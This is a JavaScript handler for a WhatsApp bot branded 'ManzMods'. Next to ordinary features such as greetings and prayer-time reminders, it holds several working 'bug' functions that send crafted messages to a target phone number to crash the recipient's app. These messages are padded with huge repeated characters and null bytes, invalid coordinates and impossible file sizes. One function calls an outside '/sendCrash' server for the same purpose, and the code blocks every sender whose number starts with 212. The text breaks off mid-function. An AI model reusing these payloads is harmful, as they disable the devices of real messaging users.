module.exports = async (p154, p155, p156) => {
  try {
    const v122 = p155.key.remoteJid;
    const v123 = p155.quoted ? p155.quoted : p155;
    const v124 = p155.mtype === "conversation" ? p155.message.conversation : p155.mtype == "imageMessage" ? p155.message.imageMessage.caption : p155.mtype == "videoMessage" ? p155.message.videoMessage.caption : p155.mtype == "extendedTextMessage" ? p155.message.extendedTextMessage.text : p155.mtype == "buttonsResponseMessage" ? p155.message.buttonsResponseMessage.selectedButtonId : p155.mtype == "listResponseMessage" ? p155.message.listResponseMessage.singleSelectReply.selectedRowId : p155.mtype === "interactiveResponseMessage" ? JSON.parse(p155.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : p155.mtype == "templateButtonReplyMessage" ? p155.message.templateButtonReplyMessage.selectedId : p155.mtype === "messageContextInfo" ? p155.message.buttonsResponseMessage?.selectedButtonId || p155.message.listResponseMessage?.singleSelectReply.selectedRowId || p155.text : "";
    const v125 = typeof p155.text == "string" ? p155.text : "";
    const v126 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v124) ? v124.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : "/";
    const v127 = v124.startsWith(v126);
    const v128 = v124.replace(v126, "").trim().split(/ +/).shift().toLowerCase();
    const v129 = v124.trim().split(/ +/).slice(1);
    const v130 = (v123.msg || v123).mimetype || "";
    const v131 = q = v129.join(" ");
    const v132 = v123.msg || v123;
    const v133 = /image|video|sticker|audio/.test(v130);
    const v134 = v122.endsWith("@g.us");
    const v135 = await p154.decodeJid(p154.user.id);
    const v136 = p155.key.fromMe ? p154.user.id.split(":")[0] + "@s.whatsapp.net" || p154.user.id : p155.key.participant || p155.key.remoteJid;
    const v137 = v136.split("@")[0];
    const v138 = p155.pushName || "" + v137;
    const v139 = v135.includes(v137);
    const v140 = v134 ? await p154.groupMetadata(p155.chat).catch(p157 => {}) : "";
    const v141 = v134 ? await v140.participants : "";
    const v142 = v134 ? await v141.filter(p158 => p158.admin !== null).map(p159 => p159.id) : "";
    const v143 = v134 ? v140.owner : "";
    const v144 = v134 ? v140.participants : "";
    const v145 = v134 ? v142.includes(v135) : false;
    const v146 = v134 ? v142.includes(v135) : false;
    const v147 = v134 ? v142.includes(v136) : false;
    const vF5 = () => {
      var v148 = fs.readFileSync("./ManzCas.js").toString();
      var v149 = (v148.match(/case '/g) || []).length;
      return v149;
    };
    const v150 = v134 ? v142.includes(v136) : false;
    const v151 = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const {
      Client: _0x126956
    } = require("ssh2");
    const {
      Deobfuscator: _0x37823c
    } = require("deobfuscator");
    const javascriptObfuscator2 = require("javascript-obfuscator");
    const {
      addSaldo: _0xd2ce04,
      minSaldo: _0x596666,
      cekSaldo: _0x2a15bb
    } = require("./all/dtbs/deposit");
    const {
      mediafireDl: _0x966574
    } = require("./all/dtbs/mediafire.js");
    let v152 = JSON.parse(fs.readFileSync("./all/dtbs/saldo.json"));
    const {
      beta1: _0x205cb3,
      beta2: _0xeeb5f,
      buk1: _0x83cd76
    } = require("./all/lib/hdr.js");
    const v153 = fs.readFileSync("./all/image/xbug.jpg");
    const v154 = fs.readFileSync("./all/image/Manz.jpg");
    const v155 = fs.readFileSync("./all/image/zkosong.png");
    const v156 = "𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝘽𝙪𝙜𝙜";
    const {
      ios: _0x3ff105
    } = require("./all/virtex/ios.js");
    const {
      telapreta3: _0x3aaec3
    } = require("./all/virtex/telapreta3.js");
    const {
      convite: _0x4e7693
    } = require("./all/virtex/convite.js");
    const {
      bugpdf: _0x109ed2
    } = require("./all/virtex/bugpdf.js");
    const {
      cP: _0x28e390
    } = require("./all/virtex/bugUrl.js");
    const {
      buttonvirus: _0x7b7e5b
    } = require("./all/virtex/button.js");
    const {
      ngazap: _0x234197
    } = require("./all/virtex/ngazap");
    const {
      notif3: _0x93b53f
    } = require("./all/virtex/notif3");
    const {
      notif4: _0x5a97d2
    } = require("./all/virtex/notif4");
    const {
      blankx7: _0x379f7f
    } = require("./all/virtex/blankx7.js");
    const {
      curix: _0x2a3497
    } = require("./all/virtex/curix.js");
    const {
      color: _0x21e982
    } = require("./all/lib/color");
    const {
      uptotelegra: _0x20ab45
    } = require("./all/lib/upload");
    const {
      remini: _0x21ac55
    } = require("./all/lib/remini");
    const {
      toPTT: _0x50a88a,
      toAudio: _0x16e5f5
    } = require("./all/lib/converter");
    const v157 = fs.readFileSync("./all/image/nulll.jpg");
    const v158 = fs.readFileSync("./all/image/nulll2.jpg");
    const v159 = fs.readFileSync("./all/image/gsz.jpg");
    const v160 = fs.readFileSync("./all/image/300/300.jpg");
    const v161 = fs.readFileSync("./all/image/300/300x.jpg");
    const v162 = fs.readFileSync("./all/image/300/300x300.jpg");
    const v163 = fs.readFileSync("./all/image/300/300x300.png");
    const v164 = fs.readFileSync("./all/image/IvS/EsQl.jpg");
    const v165 = fs.readFileSync("./all/image/IvS/ViLoc.jpg");
    const v166 = fs.readFileSync("./all/virtex/doc.apk");
    const v167 = fs.readFileSync("./all/virtex/img.jpg");
    const v168 = ["🚫"];
    const v169 = v168[Math.floor(Math.random() * v168.length)];
    const vF6 = p160 => {
      return p154.sendMessage(p155.chat, {
        react: {
          text: p160,
          key: p155.key
        }
      });
    };
    if (p155.sender.startsWith("212")) {
      return p154.updateBlockStatus(p155.sender, "block");
    }
    const v170 = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const v171 = v170[Math.floor(Math.random() * v170.length)];
    let vRuntime2 = runtime(process.uptime());
    if (v127) {
      console.log(chalk.white.bgRed.bold("Ada Pesan, Om"), _0x21e982("[ 𝐌𝐀𝐍𝐙 𝐌𝐎𝐃𝐒 ]", "green"), _0x21e982("FROM", "red"), _0x21e982("" + v138, "red"), _0x21e982("Text :", "yellow"), _0x21e982("" + v124, "blue"));
    }
    const v172 = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const v173 = moment.tz("Asia/Jakarta").format("HH : mm :ss");
    const v174 = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const v175 = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const v176 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (v176 < "23:59:00") {
      var v183 = "Selamat Malam 🏙️";
    }
    if (v176 < "19:00:00") {
      var v183 = "Selamat Petang 🌆";
    }
    if (v176 < "18:00:00") {
      var v183 = "Selamat Sore 🌇";
    }
    if (v176 < "15:00:00") {
      var v183 = "Selamat Siang 🌤️";
    }
    if (v176 < "10:00:00") {
      var v183 = "Selamat Pagi 🌄";
    }
    if (v176 < "05:00:00") {
      var v183 = "Selamat Subuh 🌆";
    }
    if (v176 < "03:00:00") {
      var v183 = "Selamat Tengah Malam 🌃";
    }
    p154.autoshalat = p154.autoshalat ? p154.autoshalat : {};
    let v184 = p155.chat;
    if (v184 in p154.autoshalat) {
      return false;
    }
    let v185 = {
      shubuh: "04:29",
      terbit: "05:44",
      dhuha: "06:02",
      dzuhur: "12:02",
      ashar: "15:15",
      magrib: "17:52",
      isya: "19:01"
    };
    const v186 = new Date(new Date().toLocaleString("en-US", {
      timeZone: "Asia/Jakarta"
    }));
    const v187 = v186.getHours();
    const v188 = v186.getMinutes();
    const v189 = v187.toString().padStart(2, "0") + ":" + v188.toString().padStart(2, "0");
    for (let [v190, v191] of Object.entries(v185)) {
      if (v189 === v191) {
        p154.autoshalat[v184] = [p154.sendMessage(p155.chat, {
          audio: {
            url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ"
          },
          mimetype: "audio/mp4",
          ptt: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              mediaType: 1,
              mediaUrl: "",
              title: "Selamat menunaikan Ibadah Sholat " + v190,
              body: "🕑 " + v191,
              sourceUrl: "",
              thumbnail: await fs.readFileSync("./all/image/jadwal.jpg"),
              renderLargerThumbnail: true
            }
          }
        }, {}), setTimeout(async () => {
          delete client.autoshalat[p155.chat];
        }, 57000)];
      }
    }
    const v192 = JSON.parse(fs.readFileSync("./all/dtbs/contacts.json"));
    const v193 = JSON.parse(fs.readFileSync("./all/dtbs/premium.json"));
    const v194 = JSON.parse(fs.readFileSync("./all/dtbs/owner.json"));
    const v195 = v192.includes(v136);
    const v196 = v193.includes(v136);
    const v197 = v194.includes(v137) || v139;
    p154.sendButtonVideo = async (p161, p162, p163, p164 = {}) => {
      var v198 = await prepareWAMessageMedia({
        video: {
          url: p164 && p164.video ? p164.video : ""
        }
      }, {
        upload: p154.waUploadToServer
      });
      let vGenerateWAMessageFromContent34 = generateWAMessageFromContent(p161, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: p164 && p164.body ? p164.body : ""
              },
              footer: {
                text: p164 && p164.footer ? p164.footer : ""
              },
              header: {
                hasMediaAttachment: true,
                videoMessage: v198.videoMessage
              },
              nativeFlowMessage: {
                buttons: p162,
                messageParamsJson: ""
              },
              contextInfo: {
                externalAdReply: {
                  title: global.namabot,
                  body: "By Manz Mods",
                  thumbnailUrl: global.imageurl,
                  sourceUrl: global.isLink,
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      }, {
        quoted: p163
      });
      await p154.sendPresenceUpdate("composing", p161);
      return p154.relayMessage(p161, vGenerateWAMessageFromContent34.message, {
        messageId: vGenerateWAMessageFromContent34.key.id
      });
    };
    async function f55() {
      var v199 = ["▓▓", "▓▓▓", "▓▓▓▓", "▒▒▒", "▒▒", "▒", "Finis ❗"];
      let {
        key: _0x67581b
      } = await p154.sendMessage(v122, {
        text: "▓"
      });
      for (let v200 = 0; v200 < v199.length; v200++) {
        await p154.sendMessage(v122, {
          text: v199[v200],
          edit: _0x67581b
        });
      }
    }
    async function f56() {
      var v201 = ["¹", "²", "³", "⁴"];
      let {
        key: _0x1f07bc
      } = await p154.sendMessage(v122, {
        text: "⚠️danger\nCrash In Count"
      });
      for (let v202 = 0; v202 < v201.length; v202++) {
        await p154.sendMessage(v122, {
          text: v201[v202],
          edit: _0x1f07bc
        });
      }
    }
    async function f57() {
      let v203 = q.replace(/[^0-9]/g, "");
      let v204 = v203 + "@s.whatsapp.net";
      var v205 = ["Sending Bugs...\n\nStatus : Sucess\nTarget : " + v204 + "\nJenis Bug : " + v128 + "\nVersion Bot : ManzMods V1.0 \nDeveloped : ManzMods \nYouTube : @ManzMods l\nTelegram : @ManzMods\n\n*Jeda 5 Menit Klo gx Delete Prem+Blok*"];
      let {
        key: _0x1a1562
      } = await p154.sendMessage(v122, {
        text: "Sending Bugs...\n\nStatus : Pending\n\nTarget : " + v204 + "\nJenis Bug : " + v128 + "\nVersion Bot : ManzMods V1.0 \nDeveloped : Manz ConstanceTzy\nYouTube : @ManzMods\nTelegram : @ManzMods"
      });
      await sleep(1000);
      for (let v206 = 0; v206 < v205.length; v206++) {
        await p154.sendMessage(v122, {
          text: v205[v206],
          edit: _0x1a1562
        });
      }
    }
    async function f58(p165, p166) {
      let v207 = "ꦾ".repeat(77777) + "@1".repeat(77777);
      var vGenerateWAMessageFromContent35 = generateWAMessageFromContent(p165, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: v207,
              sequenceNumber: "0",
              jpegThumbnail: ""
            },
            body: {
              text: "☣️⃟𝐌͢𝐀𝐍𝐙 𝐔𝐈"
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: ["6285805338638@s.whatsapp.net"],
              groupMentions: [{
                groupJid: "120363321763581234@newsletter",
                groupSubject: v207
              }]
            }
          }
        }
      }), {
        userJid: p165,
        quoted: p166
      });
      await p154.relayMessage(p165, vGenerateWAMessageFromContent35.message, {
        participant: {
          jid: p165
        },
        messageId: vGenerateWAMessageFromContent35.key.id
      });
      console.log(chalk.red.bold("Crash System Device By ManzMods"));
    }
    async function f59(p167, p168 = true) {
      let v208 = "📄⃟⃟⃟⃟⃚ ͢𝄽𝐌͋͢𝐀ᯭ𝐍͢𝐙 ͋𝐔͢𝐈ᯭ͋͢𝐂𝐑𝐀𝐒͢𝐇͋͢͢𝄽⃟⃟⃟☣️";
      let vGenerateWAMessageFromContent36 = generateWAMessageFromContent(p167, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "\0" + "ꦾ".repeat(90000),
                locationMessage: {},
                hasMediaAttachment: true
              },
              body: {
                text: v208
              },
              nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: "\0".repeat(2000)
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: p167,
        quoted: null
      });
      await p154.relayMessage(p167, vGenerateWAMessageFromContent36.message, p168 ? {
        participant: {
          jid: p167
        }
      } : {});
      console.log(chalk.white("</> ManzMods Send InvisiLoc"));
    }
    ;
    async function f60(p169) {
      try {
        const v209 = await fetchJson("http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=" + p169);
        console.log(chalk.red("Send Bug By ManzMods🐉"));
        console.log(chalk.red("InVisible⚡"));
      } catch (_0x57896a) {
        console.error("Error Fetching Crash:", _0x57896a);
      }
    }
    const v210 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "".repeat(1045000) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    const v211 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "".repeat(350000) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    const v212 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    const v213 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "".repeat(777777) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function f61(p170, p171, p172 = false) {
      let vGenerateWAMessageFromContent37 = generateWAMessageFromContent(p170, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ܜ͙͙͙͙̽̽̽̽̽̽̽̽̽̽ᝄ͢".repeat(50000),
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                  address: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                  jpegThumbnail: p171
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                    sections: [{
                      title: "𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p170,
        quoted: v211
      });
      await p154.relayMessage(p170, vGenerateWAMessageFromContent37.message, p172 ? {
        participant: {
          jid: p170
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f62(p173, p174, p175, p176 = false) {
      let vGenerateWAMessageFromContent38 = generateWAMessageFromContent(p173, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                  address: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                  jpegThumbnail: p175
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                    sections: [{
                      title: "𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p173,
        quoted: p174
      });
      await p154.relayMessage(p173, vGenerateWAMessageFromContent38.message, p176 ? {
        participant: {
          jid: p173
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f63(p177, p178, p179 = false) {
      let vGenerateWAMessageFromContent39 = generateWAMessageFromContent(p177, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + _0x379f7f + _0x3ff105,
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                  address: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                  jpegThumbnail: p178
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                    sections: [{
                      title: "𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: p177,
        quoted: v213
      });
      await p154.relayMessage(p177, vGenerateWAMessageFromContent39.message, p179 ? {
        participant: {
          jid: p177
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f64(p180, p181, p182 = false, p183 = false) {
      let vGenerateWAMessageFromContent40 = generateWAMessageFromContent(p180, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠" + _0x379f7f,
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: p181
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤🎭⃟༑⌁⃰𝐆𝐞𝐭𝐬͢𝐮𝐳𝐨𝐙͢𝐡𝐢𝐫𝐨ཀ͜͡🐉̤" + _0x379f7f
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p182 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"ᨏ\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p180,
        quoted: v212
      });
      await p154.relayMessage(p180, vGenerateWAMessageFromContent40.message, p183 ? {
        participant: {
          jid: p180
        }
      } : {});
      console.log(chalk.red("Send Bug By ManzMods🐉"));
    }
    ;
    async function f65(p184, p185, p186 = false, p187 = false) {
      let vGenerateWAMessageFromContent41 = generateWAMessageFromContent(p184, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
